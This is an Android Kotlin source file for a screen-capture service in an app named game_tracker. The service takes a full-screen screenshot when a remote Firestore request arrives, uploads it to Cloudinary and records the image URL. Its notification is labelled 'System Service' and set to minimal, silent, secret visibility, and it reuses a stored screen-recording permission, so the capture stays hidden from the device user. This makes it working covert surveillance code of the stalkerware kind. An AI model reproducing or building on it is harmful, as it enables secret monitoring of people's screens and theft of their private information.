package com.example.game_tracker

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.util.DisplayMetrics
import android.view.WindowManager
import androidx.core.app.NotificationCompat
import com.google.firebase.firestore.FieldValue
import com.google.firebase.firestore.FirebaseFirestore
import java.io.File
import java.io.FileOutputStream
import com.example.game_tracker.MediaProjectionStore

class ScreenCaptureService : Service() {

    private var mediaProjection: MediaProjection? = null
    private var imageReader: ImageReader? = null
    private var handler: Handler? = null

    override fun onCreate() {
        super.onCreate()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(ForegroundService.CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_MIN).apply {
                setShowBadge(false)
                setSound(null, null)
            }
            val mgr = getSystemService(NotificationManager::class.java)
            mgr?.createNotificationChannel(channel)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val notification: Notification = createNotification()
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(ForegroundService.NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
            } else {
                startForeground(ForegroundService.NOTIFICATION_ID, notification)
            }
        } catch (e: Throwable) {
            e.printStackTrace()
            try {
                startForeground(ForegroundService.NOTIFICATION_ID, notification)
            } catch (ex: Throwable) {
                ex.printStackTrace()
            }
        }

        val captureOnce = intent?.getBooleanExtra("capture_once", false) ?: false
        val requestId = intent?.getStringExtra("requestId")

        val resultCodeFromIntent = intent?.getIntExtra("resultCode", 0) ?: 0
        val resultDataFromIntent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            intent?.getParcelableExtra("resultData", Intent::class.java)
        } else {
            @Suppress("DEPRECATION")
            intent?.getParcelableExtra<Intent>("resultData")
        }
        val savedProjection = MediaProjectionStore.load(this)
        val resultCode = if (resultCodeFromIntent != 0) resultCodeFromIntent else if (savedProjection.first != 0) savedProjection.first else MainActivity.mediaProjectionResultCode
        val resultData = resultDataFromIntent ?: savedProjection.second ?: MainActivity.mediaProjectionResultData

        if (resultData == null || resultCode == 0) {
            requestId?.let { rid ->
                FirebaseFirestore.getInstance().collection("screenshot_requests").document(rid)
                    .update(
                        mapOf(
                            "status" to "failed",
                            "error" to "Screen capture permission missing or expired",
                            "failureReason" to "Missing saved MediaProjection result data or expired permission",
                            "completedAt" to FieldValue.serverTimestamp()
                        )
                    )
            }
            stopSelf()
            return START_NOT_STICKY
        }

        try {
            val mProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = mProjectionManager.getMediaProjection(resultCode, resultData)

            val handlerThread = HandlerThread("screencap")
            handlerThread.start()
            handler = Handler(handlerThread.looper)

            mediaProjection?.registerCallback(object : MediaProjection.Callback() {
                override fun onStop() {
                    super.onStop()
                }
            }, handler)

            if (captureOnce) {
                captureAndSaveOnce(requestId)
            }
        } catch (e: Throwable) {
            e.printStackTrace()
        }

        return START_STICKY
    }

    private fun captureAndSaveOnce(requestId: String?) {
        try {
            val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val metrics = DisplayMetrics()
            wm.defaultDisplay.getRealMetrics(metrics)
            val width = metrics.widthPixels
            val height = metrics.heightPixels
            val density = metrics.densityDpi

            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)

            if (handler == null) {
                val handlerThread = HandlerThread("screencap")
                handlerThread.start()
                handler = Handler(handlerThread.looper)
            }

            val virtualDisplay = mediaProjection?.createVirtualDisplay(
                "screencap",
                width,
                height,
                density,
                0,
                imageReader?.surface,
                null,
                handler
            )

            imageReader?.setOnImageAvailableListener({ reader ->
            val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
            val plane = image.planes[0]
            val buffer = plane.buffer
            val pixelStride = plane.pixelStride
            val rowStride = plane.rowStride
            val rowPadding = rowStride - pixelStride * width

            val bmp = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888)
            bmp.copyPixelsFromBuffer(buffer)
            image.close()

            val cropped = Bitmap.createBitmap(bmp, 0, 0, width, height)

            try {
                val cacheDir = cacheDir
                val file = File.createTempFile("screencap_", ".png", cacheDir)
                val fos = FileOutputStream(file)
                cropped.compress(Bitmap.CompressFormat.PNG, 100, fos)
                fos.flush()
                fos.close()

                // Broadcast result path to Flutter app
                val done = Intent("com.example.game_tracker.SCREENSHOT_COMPLETE")
                done.putExtra("path", file.absolutePath)
                sendBroadcast(done)

                // Upload directly to Cloudinary and update Firestore for background/killed state
                if (!requestId.isNullOrEmpty()) {
                    CloudinaryUploader.uploadFile(file) { uploadedUrl ->
                        val firestore = FirebaseFirestore.getInstance()
                        if (!uploadedUrl.isNullOrEmpty()) {
                            firestore.collection("screenshot_requests").document(requestId).update(
                                mapOf(
                                    "status" to "completed",
                                    "screenshotUrl" to uploadedUrl,
                                    "completedAt" to FieldValue.serverTimestamp()
                                )
                            )
                        } else {
                            firestore.collection("screenshot_requests").document(requestId).update(
                                mapOf(
                                    "status" to "failed",
                                    "error" to "Background screen capture upload failed",
                                    "completedAt" to FieldValue.serverTimestamp()
                                )
                            )
                        }
                    }
                }
            } catch (e: Exception) {
                e.printStackTrace()
            } finally {
                cleanup()
                stopSelf()
            }
        }, handler)
        } catch (e: Throwable) {
            e.printStackTrace()
        }
    }

    private fun cleanup() {
        try {
            imageReader?.close()
            imageReader = null
            mediaProjection?.stop()
            mediaProjection = null
            handler?.looper?.quitSafely()
            handler = null
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotification(): Notification {
        val builder = NotificationCompat.Builder(this, ForegroundService.CHANNEL_ID)
            .setSmallIcon(R.mipmap.ic_launcher)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setOngoing(true)
            .setSilent(true)
            .setLocalOnly(true)
        return builder.build()
    }
}
